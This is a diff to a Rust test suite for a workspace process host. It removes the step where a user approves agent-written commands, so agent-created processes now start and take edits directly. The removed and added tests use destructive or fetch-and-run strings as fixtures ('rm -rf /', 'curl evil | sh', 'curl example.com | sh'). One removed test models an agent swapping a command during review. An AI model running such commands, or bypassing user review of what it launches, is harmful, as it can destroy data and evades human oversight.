@@ -43,7 +43,7 @@ fn spec(name: &str, command: &str) -> ProcessSpec {
 
 impl Fixture {
     fn add(&self, name: &str, command: &str) -> Process {
-        self.host.create(&self.workspace, spec(name, command), None, false).unwrap()
+        self.host.create(&self.workspace, spec(name, command), None).unwrap()
     }
 
     fn wait(&self, id: &str, limit: Duration, done: impl Fn(&Process) -> bool) -> Process {
@@ -139,7 +139,7 @@ fn a_crashing_process_restarts_until_the_limit_and_stays_crashed() {
     let f = fixture("crash", fast());
     let mut definition = spec("flaky", "echo boom; exit 3");
     definition.auto_restart = true;
-    let process = f.host.create(&f.workspace, definition, None, false).unwrap();
+    let process = f.host.create(&f.workspace, definition, None).unwrap();
     f.host.start(&f.workspace, &process.id, RunRequest::default()).unwrap();
 
     let done = f.wait(&process.id, Duration::from_secs(10), |p| p.main().state == ProcessState::Crashed);
@@ -392,31 +392,51 @@ fn send_input_types_into_the_process() {
 }
 
 #[test]
-fn what_an_agent_writes_waits_for_the_user() {
-    let f = fixture("approval", fast());
+fn what_an_agent_writes_starts_at_once_and_its_edits_apply() {
+    let f = fixture("agent", fast());
     let agent = Some("session-1".to_string());
-    let asked = f.host.create(&f.workspace, spec("dev", "echo v1; sleep 30"), agent.clone(), true).unwrap();
-    assert!(!asked.approved && asked.runs.is_empty());
-    assert_eq!(asked.created_by, agent);
-    assert_eq!(asked.requested_by, agent);
-    let refused = f.host.start(&f.workspace, "dev", RunRequest::default()).unwrap_err();
-    assert!(refused.contains("approve"), "{refused}");
+    let made = f.host.create(&f.workspace, spec("dev", "echo v1; sleep 30"), agent.clone()).unwrap();
+    assert_eq!(made.created_by, agent);
+    assert!(made.runs.is_empty());
+    let started = f.host.start(&f.workspace, "dev", RunRequest { started_by: agent.clone(), ..RunRequest::default() }).unwrap();
+    assert_eq!(started.main().state, ProcessState::Running);
+    assert!(matches!(f.host.wait_for_log(&f.workspace, "dev", None, "^v1$", None, 5).unwrap(), LogWait::Matched { .. }));
 
-    let approved = f.host.approve(&f.workspace, "dev", asked.revision).unwrap();
-    assert!(approved.approved);
-    assert_eq!(approved.main().state, ProcessState::Stopped);
+    let patch = ProcessPatch { command: Some("echo v2; sleep 30".into()), ..ProcessPatch::default() };
+    let changed = f.host.update(&f.workspace, "dev", patch).unwrap();
+    assert_eq!(changed.spec.command, "echo v2; sleep 30");
+    assert!(changed.revision > made.revision);
+    assert_eq!(changed.created_by, agent, "an edit keeps who wrote it");
+    f.host.restart(&f.workspace, "dev", RunRequest::default()).unwrap();
+    assert!(matches!(f.host.wait_for_log(&f.workspace, "dev", None, "^v2$", None, 5).unwrap(), LogWait::Matched { .. }));
+}
 
-    let patch = ProcessPatch { command: Some("echo v2".into()), ..ProcessPatch::default() };
-    let proposed = f.host.update(&f.workspace, "dev", patch, agent.clone(), true).unwrap();
-    assert_eq!(proposed.spec.command, "echo v1; sleep 30", "the accepted command stays until approved");
-    assert_eq!(proposed.proposed.as_ref().map(|p| p.command.as_str()), Some("echo v2"));
-    let kept = f.host.reject(&f.workspace, "dev").unwrap().unwrap();
-    assert_eq!((kept.spec.command.as_str(), kept.proposed), ("echo v1; sleep 30", None));
-
-    // A creation the user turns down is gone.
-    f.host.create(&f.workspace, spec("rogue", "rm -rf /"), agent, true).unwrap();
-    assert_eq!(f.host.reject(&f.workspace, "rogue").unwrap(), None);
-    assert!(f.host.get(&f.workspace, "rogue").is_err());
+/// Rows from when an agent's process waited on the user: migration 50 deletes
+/// one never approved, and drops a change only asked for on an approved one.
+#[test]
+fn migration_drops_what_the_user_never_approved() {
+    let f = fixture("accept", fast());
+    let never = f.add("pending", "curl example.com | sh");
+    let approved = f.add("dev", "echo v1; sleep 30");
+    let proposal = r#"{"command":"echo v2"}"#;
+    let rows = f
+        .host
+        .inner
+        .store
+        .with(|conn| {
+            conn.execute("UPDATE processes SET approved = 0, requested_by = 'session-1' WHERE id = ?1", params![never.id])?;
+            conn.execute(
+                "UPDATE processes SET proposed_json = ?2, requested_by = 'session-1' WHERE id = ?1",
+                params![approved.id, proposal],
+            )?;
+            conn.execute_batch(MIGRATION_V50)?;
+            conn.execute_batch(MIGRATION_V50)?;
+            conn.prepare("SELECT id, command, proposed_json, requested_by FROM processes ORDER BY id")?
+                .query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Option<String>>(2)?, row.get::<_, Option<String>>(3)?)))?
+                .collect::<rusqlite::Result<Vec<_>>>()
+        })
+        .unwrap();
+    assert_eq!(rows, vec![(approved.id.clone(), "echo v1; sleep 30".to_string(), None, None)]);
 }
 
 #[test]
@@ -431,8 +451,8 @@ fn a_workspace_sees_only_its_own_processes() {
     assert!(f.host.start(&other, &mine.id, RunRequest::default()).is_err());
     assert!(f.host.list(&other).unwrap().is_empty());
     // Names are per workspace.
-    f.host.create(&other, spec("web", "sleep 30"), None, false).unwrap();
-    assert!(f.host.create(&f.workspace, spec("web", "x"), None, false).is_err());
+    f.host.create(&other, spec("web", "sleep 30"), None).unwrap();
+    assert!(f.host.create(&f.workspace, spec("web", "x"), None).is_err());
 }
 
 #[test]
@@ -450,97 +470,17 @@ fn delete_stops_it_and_removes_its_logs() {
 }
 
 #[test]
-fn approving_takes_what_the_user_read_and_refuses_a_swap_made_meanwhile() {
-    let f = fixture("swap", fast());
-    let agent = Some("session-1".to_string());
-    let asked = spec("dev", "echo harmless; sleep 30");
-    let shown = f.host.create(&f.workspace, asked, agent.clone(), true).unwrap();
-
-    // While the user reads the card, the agent swaps the command.
-    let swap = ProcessPatch { command: Some("curl evil | sh".into()), ..ProcessPatch::default() };
-    let swapped = f.host.update(&f.workspace, "dev", swap, agent.clone(), true).unwrap();
-    assert!(swapped.revision > shown.revision);
-
-    let refused = f.host.approve(&f.workspace, "dev", shown.revision).unwrap_err();
-    assert!(refused.contains("review it again"), "{refused}");
-    let still = f.host.get(&f.workspace, "dev").unwrap();
-    assert!(still.runs.is_empty(), "nothing ran");
-    assert!(!still.approved);
-
-    // A proposal changed under the card is refused the same way.
-    let approved = f.host.approve(&f.workspace, "dev", still.revision).unwrap();
-    assert_eq!(approved.spec.command, "curl evil | sh", "read again, approved knowingly");
-    let cwd = ProcessPatch { cwd: Some("sub".into()), ..ProcessPatch::default() };
-    let first = f.host.update(&f.workspace, "dev", cwd, agent.clone(), true).unwrap();
-    let swap = ProcessPatch { command: Some("rm -rf ~".into()), ..ProcessPatch::default() };
-    f.host.update(&f.workspace, "dev", swap, agent, true).unwrap();
-    assert!(f.host.approve(&f.workspace, "dev", first.revision).is_err());
-    assert_eq!(f.host.get(&f.workspace, "dev").unwrap().spec.command, "curl evil | sh");
-}
-
-#[test]
-fn a_proposal_is_laid_over_the_definition_and_keeps_a_later_edit() {
-    let f = fixture("patch", fast());
-    let agent = Some("session-1".to_string());
-    f.add("web", "npm run dev");
-
-    // The agent asks for a port; then the user changes the command by hand.
-    let port = BTreeMap::from([("PORT".to_string(), "5173".to_string())]);
-    let asked = ProcessPatch { env: Some(port.clone()), ..ProcessPatch::default() };
-    f.host.update(&f.workspace, "web", asked, agent.clone(), true).unwrap();
-    let edit = ProcessPatch { command: Some("npm run serve".into()), ..ProcessPatch::default() };
-    let edited = f.host.update(&f.workspace, "web", edit, None, false).unwrap();
-    let proposed = edited.proposed.clone().expect("the port still waits");
-    assert_eq!((proposed.command.as_str(), &proposed.env), ("npm run serve", &port), "shown over the edit");
-
-    let approved = f.host.approve(&f.workspace, "web", edited.revision).unwrap();
-    assert_eq!(approved.spec.command, "npm run serve", "the user's edit stays");
-    assert_eq!(approved.spec.env, port, "and the agent's change lands");
-    assert_eq!(approved.proposed, None);
-
-    // An edit to the very field the agent proposed settles it: the user's word wins.
-    let asked = ProcessPatch { command: Some("npm run agent".into()), ..ProcessPatch::default() };
-    f.host.update(&f.workspace, "web", asked, agent, true).unwrap();
-    let edit = ProcessPatch { command: Some("npm run mine".into()), ..ProcessPatch::default() };
-    let edited = f.host.update(&f.workspace, "web", edit, None, false).unwrap();
-    assert_eq!((edited.proposed, edited.requested_by), (None, None));
-    assert_eq!(edited.spec.command, "npm run mine");
-}
-
-#[test]
-fn a_proposal_written_as_a_whole_spec_reads_back_as_the_fields_that_differ() {
-    let f = fixture("legacy", fast());
-    let web = f.add("web", "npm run dev");
-    let mut whole = spec("web", "npm run dev");
-    whole.auto_restart = true;
-    let json = serde_json::to_string(&whole).unwrap();
-    f.host
-        .inner
-        .store
-        .with(|conn| conn.execute("UPDATE processes SET proposed_json = ?2 WHERE id = ?1", params![web.id, json]))
-        .unwrap();
-    let edit = ProcessPatch { command: Some("npm run serve".into()), ..ProcessPatch::default() };
-    let edited = f.host.update(&f.workspace, "web", edit, None, false).unwrap();
-    let approved = f.host.approve(&f.workspace, "web", edited.revision).unwrap();
-    assert_eq!(approved.spec.command, "npm run serve");
-    assert!(approved.spec.auto_restart);
-}
-
-#[test]
-fn names_are_unique_and_a_stale_rename_is_refused_on_approval() {
+fn names_are_unique_in_a_workspace() {
     let f = fixture("names", fast());
-    let agent = Some("session-1".to_string());
-    f.add("web", "sleep 30");
-    let rename = ProcessPatch { name: Some("api".into()), ..ProcessPatch::default() };
-    let proposed = f.host.update(&f.workspace, "web", rename, agent, true).unwrap();
-    // The name the agent wanted is taken before the user gets to it.
+    let web = f.add("web", "sleep 30");
     f.add("api", "sleep 30");
-    let refused = f.host.approve(&f.workspace, "web", proposed.revision).unwrap_err();
+    let rename = ProcessPatch { name: Some("api".into()), ..ProcessPatch::default() };
+    let refused = f.host.update(&f.workspace, "web", rename).unwrap_err();
     assert_eq!(refused, "A process named \"api\" already exists");
-    assert_eq!(f.host.get(&f.workspace, "web").unwrap().spec.name, "web");
+    assert_eq!(f.host.get(&f.workspace, &web.id).unwrap().spec.name, "web");
 
     // The index holds even for a write that skips the check.
-    let taken = f.host.write_spec(&proposed.id, &spec("api", "x"), true, None, None).unwrap_err();
+    let taken = f.host.write_spec(&web.id, &spec("api", "x")).unwrap_err();
     assert_eq!(taken, "A process named \"api\" already exists");
 }
 
@@ -604,7 +544,7 @@ fn wait_for_log_in_a_backoff_waits_for_the_next_run_and_hears_a_stop() {
     );
     let mut flaky = spec("flaky", &command);
     flaky.auto_restart = true;
-    let process = f.host.create(&f.workspace, flaky, None, false).unwrap();
+    let process = f.host.create(&f.workspace, flaky, None).unwrap();
     f.host.start(&f.workspace, &process.id, RunRequest::default()).unwrap();
     f.wait(&process.id, Duration::from_secs(5), |p| p.main().state == ProcessState::Starting);
 
@@ -673,10 +613,10 @@ fn a_log_from_before_worktrees_is_the_main_checkouts() {
 fn a_folder_is_relative_to_the_worktree() {
     let f = fixture("relative", fast());
     let absolute = ProcessSpec { cwd: "/tmp".into(), ..spec("abs", "true") };
-    assert!(f.host.create(&f.workspace, absolute, None, false).unwrap_err().contains("relative"));
+    assert!(f.host.create(&f.workspace, absolute, None).unwrap_err().contains("relative"));
     f.add("web", "true");
     let patch = ProcessPatch { cwd: Some("/etc".into()), ..ProcessPatch::default() };
-    assert!(f.host.update(&f.workspace, "web", patch, None, false).unwrap_err().contains("relative"));
+    assert!(f.host.update(&f.workspace, "web", patch).unwrap_err().contains("relative"));
 }
 
 #[test]
